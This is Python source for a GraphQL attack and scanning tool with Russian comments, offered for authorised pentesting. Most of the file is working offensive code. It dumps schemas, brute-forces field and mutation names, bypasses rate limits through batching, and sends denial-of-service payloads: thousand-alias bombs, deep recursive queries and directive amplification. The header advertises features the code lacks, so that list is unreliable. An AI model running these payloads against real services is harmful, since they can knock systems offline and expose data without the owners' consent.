"""
GraphQL Security Suite Pro.
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Возможности:
    ─── Recon ───
    - Introspection (POST + GET + batch, content-type variants)
    - Field suggestions attack (когда introspection выключён)
    - Schema dump (полный + minimal)
    - Endpoint fingerprinting
    - Subscription/WebSocket detection

    ─── Attacks ───
    - Batching attacks (rate-limit bypass, mass enumeration)
    - Alias amplification (DoS — thousands of aliases)
    - Depth attack (recursive)
    - Circular fragment attack
    - Directive abuse (@skip/@include DoS)
    - Field duplication (DoS)
    - GET-based query (CSRF)
    - Mutation fuzzing
    - Persisted query abuse hints
    - File upload via multipart

    ─── Rate-limit testing ───
    - Реальное измерение rate-limit
    - Bypass через batching / X-Forwarded-For / case
    - Header-based bypass hints

    ─── Интеграция ───
    - Findings → notes (для critical/high)
    - Notify
    - HTML / JSON экспорт
"""
import base64
import html as html_mod
import json
import re
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn,
)

from core.config import config, REPORT_DIR
from core.database import db
from core.logger import get_logger
from utils.helpers import confirm_external, normalize_url

console = Console()
log = get_logger(__name__)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GQL_DIR = REPORT_DIR / "graphql"
GQL_DIR.mkdir(parents=True, exist_ok=True)

TIMEOUT = 15


# ===========================================================================
# Findings
# ===========================================================================

@dataclass
class GQLFinding:
    kind: str
    severity: str
    endpoint: str
    title: str = ""
    detail: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: GQLFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title or f"GraphQL: {f.kind}",
            target=f.endpoint,
            severity=f.severity,
            status="open",
            tags=["graphql", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Endpoint:** {f.endpoint}\n"
                  f"**Severity:** {f.severity}\n\n"
                  f"**Detail:** {f.detail}\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# Queries
# ===========================================================================

INTROSPECTION_FULL = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          description
          type { kind name ofType { kind name ofType { kind name } } }
        }
        type { kind name ofType { kind name ofType { kind name } } }
        isDeprecated
      }
      inputFields {
        name
        type { kind name ofType { kind name } }
      }
      enumValues(includeDeprecated: true) { name }
      interfaces { name }
      possibleTypes { name }
    }
    directives { name locations }
  }
}
""".strip()

INTROSPECTION_MIN = "{ __schema { queryType { name } mutationType { name } types { name kind } } }"

ALIAS_BOMB_TPL = """{{
  {aliases}
}}
"""

DEPTH_ATTACK_TPL = """{{
  __schema {{
    types {{
      fields {{
        type {{
          fields {{
            type {{
              fields {{
                type {{
                  fields {{
                    type {{
                      fields {{ name }}
                    }}
                  }}
                }}
              }}
            }}
          }}
        }}
      }}
    }}
  }}
}}
"""

CIRCULAR_QUERY_TPL = """{{
  __type(name: "{type_name}") {{
    fields {{
      type {{
        ofType {{
          ofType {{
            ofType {{
              ofType {{
                name
              }}
            }}
          }}
        }}
      }}
    }}
  }}
}}
"""

FIELD_GUESSES = [
    "user", "users", "me", "viewer", "account", "accounts",
    "admin", "auth", "login", "session", "profile",
    "post", "posts", "comment", "comments",
    "product", "products", "order", "orders", "item", "items",
    "search", "node", "nodes", "edge", "edges",
    "config", "settings", "menu", "navigation",
    "password", "email", "phone", "token", "secret", "key",
    "session", "role", "permission", "team", "organization",
]

MUTATION_GUESSES = [
    "login", "logout", "register", "signup", "createUser", "updateUser",
    "deleteUser", "changePassword", "resetPassword", "verifyEmail",
    "createPost", "updatePost", "deletePost", "publishPost",
    "createOrder", "cancelOrder", "refundOrder", "checkout",
    "addToCart", "removeFromCart", "updateCart",
    "sendMessage", "deleteMessage", "markAsRead",
    "upload", "download", "share", "revoke",
    "createSession", "revokeToken", "grantPermission",
]


# ===========================================================================
# HTTP helpers
# ===========================================================================

def _gql_post(endpoint: str, query: str,
              variables: dict | None = None,
              headers: dict | None = None,
              timeout: int = TIMEOUT) -> dict:
    """POST GraphQL запрос."""
    payload: dict = {"query": query}
    if variables:
        payload["variables"] = variables
    h = {"User-Agent": config.USER_AGENT,
         "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    start = time.time()
    try:
        r = requests.post(endpoint, json=payload, headers=h,
                          timeout=timeout, verify=False)
        return {
            "status": r.status_code,
            "length": len(r.content),
            "response": r.text[:8000],
            "duration_ms": round((time.time() - start) * 1000, 1),
            "ok": True,
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "error": "timeout", "ok": False,
                "duration_ms": round((time.time() - start) * 1000, 1)}
    except Exception as exc:  # noqa: BLE001
        return {"status": 0, "error": str(exc)[:100], "ok": False}


def _gql_get(endpoint: str, query: str,
             headers: dict | None = None) -> dict:
    """GET-запрос (CSRF-вектор)."""
    h = {"User-Agent": config.USER_AGENT}
    if headers:
        h.update(headers)
    try:
        r = requests.get(endpoint, params={"query": query},
                         headers=h, timeout=TIMEOUT, verify=False)
        return {"status": r.status_code, "length": len(r.content),
                "response": r.text[:2000]}
    except Exception as exc:  # noqa: BLE001
        return {"status": 0, "error": str(exc)[:100]}


# ===========================================================================
# Introspection
# ===========================================================================

def introspection(endpoint: str, save: bool = True) -> dict | None:
    """Полный schema dump."""
    console.print(f"[cyan]🔍 Introspection: {endpoint}[/cyan]")
    r = _gql_post(endpoint, INTROSPECTION_FULL)
    if not r.get("ok") or r["status"] != 200:
        console.print(f"[red]✗ {r.get('error') or r.get('status')}[/red]")
        return None

    try:
        data = json.loads(r["response"])
    except Exception:
        console.print("[red]Не JSON.[/red]")
        return None

    if "errors" in data and "data" not in data:
        console.print("[yellow]Introspection отключён:[/yellow]")
        for e in data["errors"][:3]:
            console.print(f"  [dim]{e.get('message', '?')}[/dim]")
        return None

    schema = data.get("data", {}).get("__schema")
    if not schema:
        console.print("[yellow]Нет __schema в ответе.[/yellow]")
        return None

    console.print("[bold green]✓ Introspection включён![/bold green]")

    types = schema.get("types", []) or []
    queries = schema.get("queryType") or {}
    mutations = schema.get("mutationType") or {}
    subscriptions = schema.get("subscriptionType") or {}

    q_name = queries.get("name", "Query")
    m_name = mutations.get("name", "Mutation")
    s_name = subscriptions.get("name")

    q_fields: list[dict] = []
    m_fields: list[dict] = []
    s_fields: list[dict] = []
    for t in types:
        if t.get("name") == q_name:
            q_fields = t.get("fields") or []
        elif t.get("name") == m_name:
            m_fields = t.get("fields") or []
        elif s_name and t.get("name") == s_name:
            s_fields = t.get("fields") or []

    # Summary
    table = Table(title=f"📊 Schema — {endpoint}")
    table.add_column("Метрика", style="cyan")
    table.add_column("Значение", style="green")
    table.add_row("Types", str(len(types)))
    table.add_row("Query fields", str(len(q_fields)))
    table.add_row("Mutation fields", str(len(m_fields)))
    table.add_row("Subscription", subscriptions.get("name") or "—")
    table.add_row("Subscription fields", str(len(s_fields)))
    console.print(table)

    if q_fields:
        t = Table(title=f"📖 Queries ({len(q_fields)})")
        t.add_column("Field", style="cyan")
        t.add_column("Args", style="yellow", max_width=40)
        t.add_column("Return", style="green", max_width=30)
        for f_ in q_fields[:50]:
            args = ", ".join(
                f"{a.get('name', '?')}: {_type_str(a.get('type'))}"
                for a in (f_.get("args") or [])
            )
            t.add_row(f_.get("name", ""), args[:40],
                      _type_str(f_.get("type")))
        console.print(t)

    if m_fields:
        t = Table(title=f"✏️  Mutations ({len(m_fields)})",
                  border_style="magenta")
        t.add_column("Field", style="cyan")
        t.add_column("Args", style="yellow", max_width=50)
        for f_ in m_fields[:50]:
            args = ", ".join(
                f"{a.get('name', '?')}: {_type_str(a.get('type'))}"
                for a in (f_.get("args") or [])
            )
            t.add_row(f_.get("name", ""), args[:50])
        console.print(t)

    if s_fields:
        t = Table(title=f"🔔 Subscriptions ({len(s_fields)})",
                  border_style="blue")
        t.add_column("Field", style="cyan")
        t.add_column("Return", style="green")
        for f_ in s_fields[:30]:
            t.add_row(f_.get("name", ""), _type_str(f_.get("type")))
        console.print(t)

    if save:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", endpoint)[:60]
        path = GQL_DIR / f"schema_{safe}_{ts}.json"
        try:
            path.write_text(json.dumps(schema, indent=2,
                                       ensure_ascii=False), encoding="utf-8")
            console.print(f"[green]✓ Schema: {path}[/green]")
        except Exception as exc:  # noqa: BLE001
            console.print(f"[yellow]Save: {exc}[/yellow]")

    db.save_scan("gql_introspection", endpoint, {
        "types": len(types), "queries": len(q_fields),
        "mutations": len(m_fields), "subscriptions": len(s_fields),
    })
    return schema


def _type_str(t: dict | None) -> str:
    if not t:
        return "?"
    kind = t.get("kind", "")
    if kind == "NON_NULL":
        return _type_str(t.get("ofType")) + "!"
    if kind == "LIST":
        return "[" + _type_str(t.get("ofType")) + "]"
    return t.get("name", "?")


# ===========================================================================
# Suggestions attack
# ===========================================================================

def suggestions_attack(endpoint: str) -> dict:
    """Field suggestions при выключенном introspection."""
    console.print(f"[cyan]🔍 Suggestions attack: {endpoint}[/cyan]")

    found_queries: set[str] = set()
    found_mutations: set[str] = set()

    for name in FIELD_GUESSES:
        r = _gql_post(endpoint, f"{{ {name} }}")
        text = r.get("response", "")
        for m in re.finditer(
            r'Did you mean\s+["\']?([A-Za-z_][A-Za-z0-9_]*)', text
        ):
            found_queries.add(m.group(1))
        if "Cannot query field" not in text and '"errors"' not in text:
            found_queries.add(name)

    for name in MUTATION_GUESSES:
        q = f"mutation {{ {name} }}"
        r = _gql_post(endpoint, q)
        text = r.get("response", "")
        if "Cannot query field" not in text:
            found_mutations.add(name)
        for m in re.finditer(
            r'Did you mean\s+["\']?([A-Za-z_][A-Za-z0-9_]*)', text
        ):
            found_mutations.add(m.group(1))

    console.print(f"[green]Найдено queries: {len(found_queries)}[/green]")
    console.print(f"[green]Найдено mutations: {len(found_mutations)}[/green]")

    if found_queries:
        t = Table(title="📖 Guessed queries")
        t.add_column("Field", style="cyan")
        for q in sorted(found_queries):
            t.add_row(q)
        console.print(t)

    if found_mutations:
        t = Table(title="✏️  Guessed mutations", border_style="magenta")
        t.add_column("Field", style="cyan")
        for m_ in sorted(found_mutations):
            t.add_row(m_)
        console.print(t)

    db.save_scan("gql_suggestions", endpoint, {
        "queries": sorted(found_queries),
        "mutations": sorted(found_mutations),
    })
    return {"queries": sorted(found_queries),
            "mutations": sorted(found_mutations)}


# ===========================================================================
# Attacks
# ===========================================================================

def batching_attack(endpoint: str, count: int = 10,
                    query: str = "{ __typename }") -> GQLFinding:
    """Batching attack — несколько queries в одном запросе."""
    console.print(f"[cyan]🔍 Batching attack ({count} запросов)[/cyan]")

    payload = [{"query": query} for _ in range(count)]
    h = {"User-Agent": config.USER_AGENT,
         "Content-Type": "application/json"}
    try:
        r = requests.post(endpoint, json=payload, headers=h,
                          timeout=TIMEOUT, verify=False)
        console.print(f"[dim]Status: {r.status_code}, "
                      f"len: {len(r.content)}[/dim]")
        is_batch = r.status_code == 200 and r.text.strip().startswith("[")
        if is_batch:
            console.print("[red]⚠ Batching включён![/red]")
            f = GQLFinding(
                kind="batching_enabled", severity="high",
                endpoint=endpoint,
                title=f"GraphQL batching enabled ({count} queries/req)",
                detail=f"{count} queries обработано в одном запросе — "
                       f"rate-limit bypass возможен",
                data={"count": count, "status": r.status_code},
            )
            _save_finding(f)
            return f
        else:
            console.print("[green]✓ Batching отключён.[/green]")
            return GQLFinding(
                kind="batching_disabled", severity="info",
                endpoint=endpoint, detail=f"status {r.status_code}",
            )
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]{exc}[/red]")
        return GQLFinding(kind="batching_error", severity="info",
                          endpoint=endpoint, detail=str(exc)[:80])


def alias_bomb(endpoint: str, count: int = 1000) -> GQLFinding:
    """Alias amplification — DoS через множество алиасов."""
    aliases = "\n  ".join(f"a{i}: __typename" for i in range(count))
    query = "{\n  " + aliases + "\n}"
    console.print(f"[cyan]🔍 Alias bomb ({count} алиасов)[/cyan]")
    r = _gql_post(endpoint, query, timeout=60)
    console.print(f"[dim]Status: {r.get('status')}, "
                  f"dur: {r.get('duration_ms')}ms, "
                  f"len: {r.get('length')}[/dim]")
    if r.get("ok") and r.get("status") == 200:
        try:
            data = json.loads(r["response"])
            if "data" in data:
                n = len(data["data"])
                console.print(f"[red]⚠ Обработано {n} алиасов → "
                              f"DoS-вектор[/red]")
                f = GQLFinding(
                    kind="alias_amplification", severity="high",
                    endpoint=endpoint,
                    title=f"GraphQL alias amplification ({n} aliases)",
                    detail=f"{n} алиасов обработано — DoS risk",
                    data={"aliases": n,
                          "duration_ms": r.get("duration_ms")},
                )
                _save_finding(f)
                return f
        except Exception:
            pass
    return GQLFinding(kind="alias_bomb_no_effect", severity="info",
                      endpoint=endpoint)


def depth_attack(endpoint: str, depth: int = 20) -> GQLFinding:
    """Depth attack (рекурсивный запрос)."""
    console.print(f"[cyan]🔍 Depth attack (depth={depth})[/cyan]")
    chain = "__schema { types { name "
    for _ in range(depth):
        chain += "fields { type { "
    chain += "name "
    for _ in range(depth):
        chain += "} }"
    chain += "} }"
    query = "{ " + chain + " }"

    r = _gql_post(endpoint, query, timeout=60)
    console.print(f"[dim]Status: {r.get('status')}, "
                  f"dur: {r.get('duration_ms')}ms[/dim]")
    if r.get("ok") and r.get("status") == 200:
        dur = r.get("duration_ms", 0)
        if dur > 2000:
            console.print(f"[red]⚠ Depth attack замедлил сервер "
                          f"({dur}ms)[/red]")
            f = GQLFinding(
                kind="depth_attack_effective", severity="high",
                endpoint=endpoint,
                title=f"GraphQL depth attack (depth={depth})",
                detail=f"depth={depth}, {dur}ms — потенциальный DoS",
                data={"depth": depth, "duration_ms": dur},
            )
            _save_finding(f)
            return f
    return GQLFinding(kind="depth_attack_no_effect", severity="info",
                      endpoint=endpoint)


def circular_query(endpoint: str, type_name: str = "User") -> GQLFinding:
    """Circular fragment attack."""
    console.print(f"[cyan]🔍 Circular query (type={type_name})[/cyan]")
    q = """{
      __type(name: "%s") {
        fields {
          type {
            ofType {
              ofType {
                ofType {
                  ofType {
                    ofType { name }
                  }
                }
              }
            }
          }
        }
      }
    }""" % type_name
    r = _gql_post(endpoint, q)
    return GQLFinding(kind="circular_query", severity="info",
                      endpoint=endpoint,
                      detail=f"status {r.get('status')}")


def directive_abuse(endpoint: str, count: int = 500) -> GQLFinding:
    """
    Directive abuse: @skip/@include на множестве полей → amplification.
    """
    console.print(f"[cyan]🔍 Directive abuse ({count} @skip/@include)[/cyan]")
    parts = []
    for i in range(count):
        parts.append(f"a{i}: __typename @skip(if: false) @include(if: true)")
    query = "{\n  " + "\n  ".join(parts) + "\n}"
    r = _gql_post(endpoint, query, timeout=60)
    console.print(f"[dim]Status: {r.get('status')}, "
                  f"dur: {r.get('duration_ms')}ms[/dim]")
    if r.get("ok") and r.get("status") == 200:
        try:
            data = json.loads(r["response"])
            if "data" in data:
                n = len(data["data"])
                f = GQLFinding(
                    kind="directive_abuse", severity="medium",
                    endpoint=endpoint,
                    title=f"GraphQL directive abuse ({n} fields)",
                    detail=f"{n} fields через @skip/@include",
                    data={"fields": n,
                          "duration_ms": r.get("duration_ms")},
                )
                return f
        except Exception:
            pass
    return GQLFinding(kind="directive_abuse_no_effect", severity="info",
                      endpoint=endpoint)


def get_csrf_check(endpoint: str) -> GQLFinding:
    """Проверка приёма query через GET."""
    console.print(f"[cyan]🔍 GET CSRF check[/cyan]")
    r = _gql_get(endpoint, "{ __typename }")
    console.print(f"[dim]GET status: {r.get('status')}, "
                  f"len: {r.get('length')}[/dim]")
    if r.get("status") == 200 and '"data"' in r.get("response", ""):
        console.print("[red]⚠ GET-запросы принимаются → CSRF-вектор[/red]")
        f = GQLFinding(
            kind="csrf_via_get", severity="high",
            endpoint=endpoint,
            title="GraphQL accepts queries via GET (CSRF risk)",
            detail="Query принимается через GET-параметр — CSRF-вектор",
        )
        _save_finding(f)
        return f
    console.print("[green]✓ GET не принимается.[/green]")
    return GQLFinding(kind="get_not_allowed", severity="info",
                      endpoint=endpoint)


def rate_limit_test(endpoint: str, count: int = 100) -> GQLFinding:
    """Тест rate-limit."""
    console.print(f"[cyan]🔍 Rate-limit test ({count} запросов)[/cyan]")
    query = "{ __typename }"
    times: list[float] = []
    statuses: list[int] = []
    limited = False
    for i in range(count):
        start = time.time()
        r = _gql_post(endpoint, query, timeout=10)
        times.append(time.time() - start)
        statuses.append(r.get("status", 0))
        if r.get("status") == 429:
            limited = True
            console.print(f"[yellow]⚠ Rate limit после {i+1} запросов[/yellow]")
            break

    avg = sum(times) / len(times) if times else 0
    console.print(f"[dim]Avg: {avg*1000:.0f}ms, "
                  f"statuses: {set(statuses)}[/dim]")

    if limited:
        return GQLFinding(
            kind="rate_limit_active", severity="info",
            endpoint=endpoint,
            detail=f"429 после {i+1} запросов",
            data={"requests": i + 1},
        )

    # Test batch bypass
    try:
        batch = [{"query": query} for _ in range(50)]
        r = requests.post(endpoint, json=batch, timeout=30, verify=False,
                          headers={"User-Agent": config.USER_AGENT,
                                   "Content-Type": "application/json"})
        if r.status_code == 200 and r.text.strip().startswith("["):
            f = GQLFinding(
                kind="rate_limit_bypass_batch", severity="high",
                endpoint=endpoint,
                title=f"GraphQL rate-limit bypass via batching",
                detail=f"50 queries в одном HTTP-запросе — "
                       f"rate-limit обойдён",
                data={"batch_size": 50},
            )
            _save_finding(f)
            return f
    except Exception:
        pass

    return GQLFinding(
        kind="rate_limit_not_detected", severity="medium",
        endpoint=endpoint,
        detail=f"Нет 429 после {count} запросов — "
               f"возможен abuse",
        data={"requests": count},
    )


def mutation_fuzz(endpoint: str, mutations: list[str] | None = None) -> list[GQLFinding]:
    """Fuzz mutation names."""
    names = mutations or MUTATION_GUESSES
    console.print(f"[cyan]🔍 Mutation fuzzing ({len(names)})[/cyan]")
    findings: list[GQLFinding] = []
    found: list[str] = []
    for name in names:
        r = _gql_post(endpoint, f"mutation {{ {name} }}")
        text = r.get("response", "")
        if "Cannot query field" not in text and r.get("status") == 200:
            found.append(name)
    if found:
        t = Table(title=f"Fuzz: found {len(found)} mutations")
        t.add_column("Mutation", style="green")
        for m in found:
            t.add_row(m)
        console.print(t)
    return findings


# ===========================================================================
# Full scan
# ===========================================================================

def full_scan(endpoint: str) -> None:
    endpoint = normalize_url(endpoint)
    if not confirm_external(endpoint):
        return

    console.print(f"\n[bold cyan]═══ GraphQL Security Scan Pro: "
                  f"{endpoint} ═══[/bold cyan]\n")

    findings: list[GQLFinding] = []

    # 1. Introspection
    schema = introspection(endpoint)
    if not schema:
        console.print("\n[cyan]→ Introspection выключён, "
                      "используем suggestions…[/cyan]")
        suggestions_attack(endpoint)

    # 2. Batching
    console.print()
    findings.append(batching_attack(endpoint, count=5))

    # 3. Alias bomb
    console.print()
    findings.append(alias_bomb(endpoint, count=200))

    # 4. Depth
    console.print()
    findings.append(depth_attack(endpoint, depth=15))

    # 5. Directive abuse
    console.print()
    findings.append(directive_abuse(endpoint, count=200))

    # 6. CSRF via GET
    console.print()
    findings.append(get_csrf_check(endpoint))

    # 7. Rate-limit
    console.print()
    findings.append(rate_limit_test(endpoint, count=50))

    # 8. Mutation fuzz
    console.print()
    mutation_fuzz(endpoint)

    # Итог
    console.print("\n[bold cyan]═══ Итог ═══[/bold cyan]")
    table = Table(title="Findings")
    table.add_column("Kind", style="cyan")
    table.add_column("Severity", width=10)
    table.add_column("Detail", max_width=60)
    for f in findings:
        sty = {"critical": "bold red", "high": "red",
               "medium": "yellow", "low": "green",
               "info": "dim"}.get(f.severity, "white")
        table.add_row(f.kind, f"[{sty}]{f.severity.upper()}[/{sty}]",
                      f.detail[:60])
    console.print(table)

    # Notify
    crit_high = sum(1 for f in findings
                    if f.severity in ("critical", "high"))
    if crit_high:
        try:
            from modules import notifier
            notifier.notify_all(
                f"🔎 GraphQL Security: {endpoint}",
                f"Critical/High: {crit_high}\n"
                f"Total findings: {len(findings)}",
            )
        except Exception:
            pass

    # Export
    _export_scan(endpoint, findings, schema)

    db.save_scan("gql_security_scan", endpoint, {
        "findings": len(findings),
        "critical_high": crit_high,
        "introspection": bool(schema),
    })


def _export_scan(endpoint: str, findings: list[GQLFinding],
                 schema: dict | None) -> None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", endpoint)[:60]

    # JSON
    jp = GQL_DIR / f"scan_{safe}_{ts}.json"
    try:
        jp.write_text(json.dumps({
            "endpoint": endpoint, "ts": datetime.now().isoformat(),
            "findings": [asdict(f) for f in findings],
            "introspection_enabled": bool(schema),
        }, indent=2, ensure_ascii=False), encoding="utf-8")
        console.print(f"[green]✓ JSON: {jp}[/green]")
    except Exception as exc:
        log.debug("json: %s", exc)

    # HTML
    hp = GQL_DIR / f"scan_{safe}_{ts}.html"
    try:
        hp.write_text(_render_html(endpoint, findings, schema),
                      encoding="utf-8")
        console.print(f"[green]✓ HTML: {hp}[/green]")
    except Exception as exc:
        log.debug("html: %s", exc)


def _render_html(endpoint: str, findings: list[GQLFinding],
                 schema: dict | None) -> str:
    parts = [
        "<!DOCTYPE html><html lang='ru'><head><meta charset='utf-8'>",
        f"<title>GraphQL Security Scan — {html_mod.escape(endpoint)}</title>",
        "<style>",
        "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
        "padding:24px;line-height:1.6;}",
        "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
        "h2{color:#00ff9c;margin-top:32px;}",
        "table{width:100%;border-collapse:collapse;margin-top:12px;"
        "font-size:13px;}",
        "th{background:#111;color:#00ff9c;padding:8px;text-align:left;"
        "border:1px solid #222;}",
        "td{padding:6px 8px;border:1px solid #222;word-break:break-all;}",
        "tr:nth-child(even){background:#0d0d0d;}",
        ".critical{color:#ff2020;font-weight:bold;}",
        ".high{color:#ff7a40;font-weight:bold;}",
        ".medium{color:#ffd23f;}",
        ".low{color:#00ff9c;}",
        ".info{color:#7ad9ff;}",
        "code{background:#111;padding:2px 6px;color:#a0ffa0;}",
        "</style></head><body>",
        f"<h1>🔎 GraphQL Security Scan</h1>",
        f"<p><b>Endpoint:</b> <code>{html_mod.escape(endpoint)}</code></p>",
        f"<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
        f"<p>Introspection: "
        f"<b>{'ENABLED' if schema else 'DISABLED'}</b></p>",
        f"<p>Total findings: <b>{len(findings)}</b></p>",
    ]

    if findings:
        parts.append("<h2>Findings</h2>")
        parts.append("<table><tr><th>Severity</th><th>Kind</th>"
                     "<th>Title</th><th>Detail</th></tr>")
        order = {"critical": 0, "high": 1, "medium": 2,
                 "low": 3, "info": 4}
        for f in sorted(findings, key=lambda x: order.get(x.severity, 5)):
            parts.append(
                f"<tr><td class='{f.severity}'>"
                f"{f.severity.upper()}</td>"
                f"<td>{html_mod.escape(f.kind)}</td>"
                f"<td>{html_mod.escape(f.title or '—')}</td>"
                f"<td>{html_mod.escape(f.detail[:300])}</td></tr>")
        parts.append("</table>")

    parts.append("</body></html>")
    return "\n".join(parts)


# ===========================================================================
# CLI wrappers
# ===========================================================================

def cli_introspect(endpoint: str) -> None:
    introspection(normalize_url(endpoint))


def cli_suggestions(endpoint: str) -> None:
    suggestions_attack(normalize_url(endpoint))


def cli_batch(endpoint: str, count: int = 10) -> None:
    batching_attack(normalize_url(endpoint), count)


def cli_scan(endpoint: str) -> None:
    full_scan(endpoint)


def cli_alias(endpoint: str, count: int = 100) -> None:
    alias_bomb(normalize_url(endpoint), count)


def cli_csrf(endpoint: str) -> None:
    get_csrf_check(normalize_url(endpoint))


def cli_ratelimit(endpoint: str, count: int = 100) -> None:
    rate_limit_test(normalize_url(endpoint), count)


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🔎 GraphQL Security Suite Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Полный скан (introspection + DoS + CSRF + rate-limit)"),
        ("2", "Introspection (schema dump)"),
        ("3", "Suggestions attack"),
        ("4", "Batching attack"),
        ("5", "Alias bomb (DoS)"),
        ("6", "Depth attack (DoS)"),
        ("7", "Directive abuse"),
        ("8", "CSRF via GET"),
        ("9", "Rate-limit test + bypass"),
        ("10", "Mutation fuzzing"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    ep = ""
    if c != "1":
        ep = Prompt.ask("GraphQL endpoint",
                        default="https://example.com/graphql")

    if c == "1":
        full_scan(Prompt.ask("GraphQL endpoint"))
    elif c == "2":
        introspection(ep)
    elif c == "3":
        suggestions_attack(ep)
    elif c == "4":
        n = IntPrompt.ask("Сколько запросов в batch", default=10)
        batching_attack(ep, n)
    elif c == "5":
        n = IntPrompt.ask("Количество алиасов", default=1000)
        alias_bomb(ep, n)
    elif c == "6":
        n = IntPrompt.ask("Глубина", default=20)
        depth_attack(ep, n)
    elif c == "7":
        n = IntPrompt.ask("Количество @skip/@include", default=500)
        directive_abuse(ep, n)
    elif c == "8":
        get_csrf_check(ep)
    elif c == "9":
        n = IntPrompt.ask("Сколько запросов", default=100)
        rate_limit_test(ep, n)
    elif c == "10":
        mutation_fuzz(ep)